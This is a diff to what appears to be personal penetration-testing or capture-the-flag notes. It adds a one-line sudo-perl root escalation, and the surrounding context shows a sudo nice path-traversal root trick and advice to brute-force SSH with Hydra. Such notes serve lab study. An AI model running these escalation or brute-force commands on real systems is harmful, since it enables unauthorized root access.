@@ -49,6 +49,11 @@
   - ```echo "/bin/bash" >> letsgetroot.sh``` save the file in any directory
   - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.
 
+
+- if you find ```(ALL : ALL) NOPASSWD: /usr/bin/perl``` in ```sudo -l```
+  - then use the below command it will give you the root privilege
+  - ```sudo perl -e 'exec "/bin/bash";'```
+
 - ## Hydra <a name="hydra"></a>
 - ssh renu@127.0.0.1
 - if you don't know the password do brute force attack. replace username with ```renu``` and ipaddress with ```127.0.01```
